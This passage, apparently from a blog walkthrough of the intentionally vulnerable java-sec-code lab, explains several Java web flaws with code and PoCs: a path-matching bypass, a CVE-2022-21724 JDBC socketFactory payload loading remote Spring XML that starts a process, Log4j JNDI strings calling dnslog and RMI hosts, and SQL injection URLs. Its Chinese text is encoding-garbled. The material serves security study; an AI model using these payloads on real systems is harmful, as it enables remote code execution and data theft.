class="hljs-variable">servletPath</span> <span class="hljs-operator">=</span> request.getServletPath();<br>       <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;getRequestURI: &quot;</span> + uri + <span class="hljs-string">&quot;\ngetServletPath: &quot;</span> + servletPath;<br>   &#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080935368.png" alt="20250724152429560"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080936550.png" alt="20250724152503479"></p><p>æƒ³è¦åˆ©ç”¨å°±æ”¹ä¸€ä¸‹åŒ¹é…è§„åˆ™ï¼š</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-type">String</span>[] excluedPath = &#123;<span class="hljs-string">&quot;/uri/css/**&quot;</span>, <span class="hljs-string">&quot;/uri/js/**&quot;</span>&#125;;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080936819.png" alt="20250724152945636"></p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">poc:</span><br><span class="hljs-keyword">/uri/</span>css/..<span class="hljs-punctuation">;</span><span class="hljs-keyword">/exclued/</span>vuln<br><span class="hljs-keyword">/uri/</span>css/..<span class="hljs-punctuation">;</span>bypasswaf<span class="hljs-keyword">/exclued/</span>vuln<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080936089.png" alt="20250724153028787"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080936309.png" alt="20250724153553391"></p><h2 id="jdbc-CVE-2022-21724"><a href="#jdbc-CVE-2022-21724" class="headerlink" title="jdbc-CVE 2022 21724"></a>jdbc-CVE 2022 21724</h2><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080936646.png" alt="20250725111517628"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(&quot;/jdbc&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Jdbc</span> &#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * &lt;a href=&quot;https://github.com/JoyChou93/java-sec-code/wiki/CVE-2022-21724&quot;&gt;CVE-2022-21724&lt;/a&gt;</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/postgresql&quot;)</span><br>    <span class="hljs-comment">//æ¥æ”¶ Base64 ç¼–ç çš„ jdbcurl ï¼Œ</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">postgresql</span><span class="hljs-params">(String jdbcUrlBase64)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">byte</span>[] b = java.util.Base64.getDecoder().decode(jdbcUrlBase64);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">jdbcUrl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(b);<br>        log.info(jdbcUrl);<br>        DriverManager.getConnection(jdbcUrl);<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(&quot;/db2&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">db2</span><span class="hljs-params">(String jdbcUrlBase64)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Class.forName(<span class="hljs-string">&quot;com.ibm.db2.jcc.DB2Driver&quot;</span>);<br>        <span class="hljs-type">byte</span>[] b = java.util.Base64.getDecoder().decode(jdbcUrlBase64);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">jdbcUrl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(b);<br>        log.info(jdbcUrl);<br>        DriverManager.getConnection(jdbcUrl);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>PostgreSQL JDBC é©±åŠ¨æ”¯æŒé€šè¿‡ JDBC URL ä¸­çš„å‚æ•° <code>socketFactory</code> æŒ‡å®šè‡ªå®šä¹‰ç±»ï¼Œç”¨äºåˆ›å»º socket è¿æ¥ã€‚</p><p><strong>åœ¨æ¼æ´ç‰ˆæœ¬ä¸­ï¼Œè¿™ä¸ªç±»æ²¡æœ‰é™åˆ¶æ¥æº</strong>ï¼Œæ”»å‡»è€…å¯é€šè¿‡å¦‚ä¸‹ URL å‚æ•°è®©å…¶åŠ è½½ä»»æ„ç±»ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">socketFactory=<span class="hljs-tag">&lt;<span class="hljs-name">ä»»æ„ç±»</span>&gt;</span>&amp;socketFactoryArg=<span class="hljs-tag">&lt;<span class="hljs-name">ä»»æ„å‚æ•°</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Spring ç¯å¢ƒä¸­å­˜åœ¨çš„ <code>org.springframework.context.support.ClassPathXmlApplicationContext</code> æ˜¯ä¸€ä¸ªå…¸å‹çš„å…¥å£ç‚¹ï¼Œå®ƒå¯è‡ªåŠ¨è§£æå¹¶æ‰§è¡Œå¤–éƒ¨ XML é…ç½®ã€‚</p><p>payloadï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">jdbcUrlBase64=amRiYzpwb3N0Z3Jlc3FsOi8vMTI3LjAuMC4xOjU0MzIvdGVzdC8/c29ja2V0RmFjdG9yeT1vcmcuc3ByaW5nZnJhbWV3b3JrLmNvbnRleHQuc3VwcG9ydC5DbGFzc1BhdGhYbWxBcHBsaWNhdGlvbkNvbnRleHQmc29ja2V0RmFjdG9yeUFyZz1odHRwOi8vdGVzdC5qb3ljaG91Lm9yZy8xLnhtbA==<br><br>jdbc:postgresql:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">5432</span><span class="hljs-regexp">/test/</span>?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&amp;socketFactoryArg=http:<span class="hljs-regexp">//</span>test.joychou.org/<span class="hljs-number">1</span>.xml<br></code></pre></td></tr></table></figure><p><strong>socketFactory</strong> &#x3D; ä½¿ç”¨äº† Spring çš„ <code>ClassPathXmlApplicationContext</code> ç±»</p><ul><li>è¯¥ç±»åœ¨åˆå§‹åŒ–æ—¶ä¼šåŠ è½½å¹¶è§£ææŒ‡å®š URL æˆ–æ–‡ä»¶çš„ Spring XML é…ç½®ã€‚</li></ul><p><strong>socketFactoryArg</strong> &#x3D; è¿œç¨‹çš„ <code>1.xml</code></p><ul><li>è¿™ä¸ª XML æ˜¯ Spring Bean é…ç½®æ–‡ä»¶ï¼ŒåŒ…å«äº†ä¸€ä¸ª <strong>ProcessBuilder</strong> Beanï¼Œå¯åŠ¨æœ¬åœ°ç¨‹åºã€‚</li></ul><p>1.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:p</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/p&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="hljs-string"><span class="hljs-tag">        http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br><br>   <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;exec&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="hljs-attr">init-method</span>=<span class="hljs-string">&quot;start&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>open<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>-a<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>calculator<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><span class="hljs-comment">&lt;!-- mac ä¸­è¿è¡Œè®¡ç®—æœºï¼›Linux å°±æ˜¯ /bin/shï¼ŒWindows å°±æ˜¯ cmd.exe--&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="jsonp"><a href="#jsonp" class="headerlink" title="jsonp"></a>jsonp</h2><blockquote><p>JSONPï¼ˆJSON with Paddingï¼‰æ˜¯æµè§ˆå™¨æ—©æœŸä¸ºäº†è§£å†³<strong>è·¨åŸŸè¯·æ±‚æ•°æ®</strong>çš„ä¸€ç§æ–¹æ³•ã€‚å®ƒçš„åŸºæœ¬åŸç†æ˜¯ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://example.com/jsonp?callback=handleResponse&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æœåŠ¡å™¨è¿”å›çš„ä¸æ˜¯ JSONï¼Œè€Œæ˜¯ï¼š</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl">&gt;<span class="hljs-function"><span class="hljs-title">handleResponse</span>(&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>&#125;);</span><br></code></pre></td></tr></table></figure><p>å¦‚æœæœåŠ¡å™¨ä¸ä¸¥æ ¼æ ¡éªŒ <code>callback</code> å‚æ•°æ¥æºï¼Œå°±å¯èƒ½é€ æˆ <strong>è·¨ç«™æ•°æ®æ³„éœ²ï¼ˆXSSï¼‰</strong> æˆ– <strong>ä¿¡æ¯æ³„éœ²æ¼æ´</strong>ã€‚</p></blockquote><p><strong>æ¼æ´åˆ©ç”¨ï¼š</strong></p><p>æœå…³é”®å­—ï¼š<code>AbstractJsonpResponseBodyAdvice</code> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@ControllerAdvice</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Object2Jsonp</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractJsonpResponseBodyAdvice</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String[] callbacks;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Logger logger= LoggerFactory.getLogger(<span class="hljs-built_in">this</span>.getClass());<br><br><br>    <span class="hljs-comment">// method of using @Value in constructor</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Object2Jsonp</span><span class="hljs-params">(<span class="hljs-meta">@Value(&quot;$&#123;joychou.security.jsonp.callback&#125;&quot;)</span> String[] callbacks)</span> &#123;<br>        <span class="hljs-built_in">super</span>(callbacks);  <span class="hljs-comment">// Can set multiple paramNames</span><br>        <span class="hljs-built_in">this</span>.callbacks = callbac<br></code></pre></td></tr></table></figure><h2 id="Log4j"><a href="#Log4j" class="headerlink" title="Log4j"></a>Log4j</h2><p>ç‰ˆæœ¬å­˜åœ¨æ¼æ´</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080938586.png" alt="20250725135906016"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-meta">@RequestMapping(value = &quot;/log4j&quot;)</span><br><span class="hljs-comment">//ä½¿ç”¨ logger.error(token) å°†ç”¨æˆ·è¾“å…¥å†™å…¥æ—¥å¿—ã€‚å¦‚æœ Log4j ä½¿ç”¨çš„æ˜¯å—å½±å“ç‰ˆæœ¬ï¼Œè¿™é‡Œçš„ $&#123;jndi:ldap://...&#125; å°†è¢«è§£ææ‰§è¡Œï¼Œè§¦å‘è¿œç¨‹åŠ è½½ç±»ï¼Œå¯¼è‡´ RCE</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">log4j</span><span class="hljs-params">(String token)</span> &#123;<br>       logger.error(token);<br>       <span class="hljs-keyword">return</span> token;<br>   &#125;<br></code></pre></td></tr></table></figure><p>POC1:</p><p><code>/log4j?token=${jndi:ldap://${env:OS}.44wodg.dnslog.cn}</code></p><p><strong>ç›´æ¥è®¿é—®ä¼šå¯¹éæ³•å­—ç¬¦è¿‡æ»¤ï¼Œéœ€è¦ url ç¼–ç åæ³¨å…¥</strong></p><p><code>/log4j?token=%24%7Bjndi%3Aldap%3A%2F%2F%24%7Benv%3AOS%7D.44wodg.dnslog.cn%7D</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080938049.png" alt="20250725141100248"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080938015.png" alt="20250725141125185"></p><p>POC2:</p><p><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;calc&quot;</code></p><p><code>rmi://169.254.39.1:1099/ihe2v1</code></p><p><code>${jndi:rmi://169.254.39.1:1099/ihe2v1}</code></p><p><code>/log4j?token=${jndi:rmi://169.254.39.1:1099/ihe2v1}</code></p><p><code>url ç¼–ç ï¼š/log4j?token=%24%7Bjndi%3Armi%3A%2F%2F169.254.39.1%3A1099%2Fihe2v1%7D</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080939169.png" alt="20250725141328166"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080939335.png" alt="20250725141333552"></p><h2 id="PathTraversal"><a href="#PathTraversal" class="headerlink" title="PathTraversal"></a>PathTraversal</h2><p>æ²¡æœ‰å¯¹æ–‡ä»¶è·¯å¾„åšä»»ä½•è¿‡æ»¤ï¼Œæ”»å‡»è€…å¯ä»¥è®¿é—®ä»»æ„æ–‡ä»¶</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080939585.png" alt="20250725142845129"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080939910.png" alt="20250725142909337"></p><h2 id="SQLI"><a href="#SQLI" class="headerlink" title="SQLI"></a>SQLI</h2><h3 id="1-jdbc-vuln"><a href="#1-jdbc-vuln" class="headerlink" title="1.&#x2F;jdbc&#x2F;vuln"></a>1.&#x2F;jdbc&#x2F;vuln</h3><p>æ³¨å…¥ç‚¹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@RequestMapping(&quot;/jdbc/vuln&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">jdbc_sqli_vul</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;username&quot;)</span> String username)</span> &#123;<br>    ...<br>    <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from users where username = &#x27;&quot;</span> + username + <span class="hljs-string">&quot;&#x27;&quot;</span>;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>url:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8081</span><span class="hljs-regexp">/sqli/</span>jdbc/vuln?username=joycho<span class="hljs-string">u&#x27; OR &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080940681.png" alt="20250725132643238"></p><h3 id="2-jdbc-sec"><a href="#2-jdbc-sec" class="headerlink" title="2.&#x2F;jdbc&#x2F;sec"></a>2.&#x2F;jdbc&#x2F;sec</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/jdbc/sec&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">jdbc_sqli_sec</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;username&quot;)</span> String username)</span> &#123;<br>...<br>    <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from users where username = ?&quot;</span>;<br>    ...<br>&#125;    <br></code></pre></td></tr></table></figure><p>é‡‡ç”¨é¢„ç¼–è¯‘ï¼Œè‡ªåŠ¨è¿›è¡Œäº†è½¬ä¹‰ï¼Œå®‰å…¨</p><h3 id="3-jdbc-ps-vuln"><a href="#3-jdbc-ps-vuln" class="headerlink" title="3.&#x2F;jdbc&#x2F;ps&#x2F;vuln"></a>3.&#x2F;jdbc&#x2F;ps&#x2F;vuln</h3><blockquote><p><code>PreparedStatement</code> æ˜¯ Java JDBC æä¾›çš„ <strong>é¢„ç¼–è¯‘ SQL è¯­å¥æ‰§è¡Œå™¨</strong>ï¼Œç”¨äºå®‰å…¨æ‰§è¡Œ SQL æŸ¥è¯¢ï¼Œ<strong>é˜²æ­¢ SQL æ³¨å…¥</strong>ã€‚</p><p><code>PreparedStatement</code> æ˜¯ <code>java.sql</code> åŒ…ä¸­çš„ä¸€ä¸ªæ¥å£ï¼Œç»§æ‰¿è‡ª <code>Statement</code>ã€‚ä¸æ™®é€šçš„ <code>Statement</code> ç›¸æ¯”ï¼Œå®ƒå¯ä»¥ä½¿ç”¨ <code>?</code> å ä½ç¬¦æ¥åŠ¨æ€ç»‘å®šå‚æ•°ï¼Œè€Œä¸æ˜¯ç›´æ¥æ‹¼æ¥ SQL å­—ç¬¦ä¸²ã€‚</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/jdbc/ps/vuln&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">jdbc_ps_vuln</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;username&quot;)</span> String username)</span> &#123;<br>...<br><span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from users where username = &#x27;&quot;</span> + username + <span class="hljs-string">&quot;&#x27;&quot;</span>;<br>    <span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">st</span> <span class="hljs-operator">=</span> con.prepareStatement(sql);<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>é”™è¯¯ä½¿ç”¨ PreparedStatement , è™½ç„¶ç”¨çš„æ˜¯ <code>PreparedStatement</code>ï¼Œä½† SQL å·²æ‹¼æ¥å®Œæˆï¼Œè¿˜æ˜¯æœ‰æ³¨å…¥é£é™©ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// æ­£ç¡®ä½¿ç”¨èŒƒå¼ </span><br><span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;SELECT * FROM users WHERE username = ?&quot;</span>;<br><span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">st</span> <span class="hljs-operator">=</span> con.prepareStatement(sql); <br>st.setString(<span class="hljs-number">1</span>,  username);  <span class="hljs-comment">// å‚æ•°ç»‘å®š </span><br></code></pre></td></tr></table></figure><p>url:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8081</span><span class="hljs-regexp">/sqli/</span>jdbc<span class="hljs-regexp">/ps/</span>vuln?username=joycho<span class="hljs-string">u&#x27; OR &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080940290.png" alt="20250725133408711"></p><h3 id="4-mybatis-vuln01"><a href="#4-mybatis-vuln01" class="headerlink" title="4.&#x2F;mybatis&#x2F;vuln01"></a>4.&#x2F;mybatis&#x2F;vuln01</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/mybatis/vuln01&quot;)</span><br>   <span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">mybatisVuln01</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;username&quot;)</span> String username)</span> &#123;<br>       <span class="hljs-keyword">return</span> userMapper.findByUserNameVuln01(username);<br>   &#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Select(&quot;select * from users where username = &#x27;$&#123;username&#125;&#x27;&quot;)</span><br>List&lt;User&gt; <span class="hljs-title function_">findByUserNameVuln01</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;username&quot;)</span> String username)</span>;<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/sqli/my</span>batis/vuln01?username=admin<span class="hljs-string">&#x27; OR &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>è¿”å›æ•°æ®åº“ä¸­æ‰€æœ‰ç”¨æˆ·</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080940609.png" alt="20250725134006587"></p><h3 id="5-mybatis-vuln02"><a href="#5-mybatis-vuln02" class="headerlink" title="5.&#x2F;mybatis&#x2F;vuln02"></a>5.&#x2F;mybatis&#x2F;vuln02</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/mybatis/vuln02&quot;)</span><br>    <span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">mybatisVuln02</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;username&quot;)</span> String username)</span> &#123;<br>        <span class="hljs-keyword">return</span> userMapper.findByUserNameVuln02(username);<br>    &#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;User&gt; <span class="hljs-title function_">findByUserNameVuln02</span><span class="hljs-params">(String username)</span>;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;findByUserNameVuln02&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;String&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;User&quot;</span>&gt;</span><br>        select * from users where username like &#x27;%$&#123;_parameter&#125;%&#x27;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><p>XML é…ç½®ä¸­æ‹¼æ¥ like + <code>${}</code></p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs axapta">/sqli/mybatis/vuln02?username=<span class="hljs-string">&#x27; OR &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br>-&gt;<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%&#x27;</span> OR <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1%&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080940734.png" alt="20250725134316209"></p><h3 id="6-mybatis-orderby-vuln03"><a href="#6-mybatis-orderby-vuln03" class="headerlink" title="6.&#x2F;mybatis&#x2F;orderby&#x2F;vuln03"></a>6.&#x2F;mybatis&#x2F;orderby&#x2F;vuln03</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/mybatis/orderby/vuln03&quot;)</span><br>   <span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">mybatisVuln03</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;sort&quot;)</span> String sort)</span> &#123;<br>       <span class="hljs-keyword">return</span> userMapper.findByUserNameVuln03(sort);<br>   &#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;User&gt; <span class="hljs-title function_">findByUserNameVuln03</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;order&quot;)</span> String order)</span>;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;findByUserNameVuln03&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;String&quot;</span> <span class="hljs-attr">resultMap</span>=<span 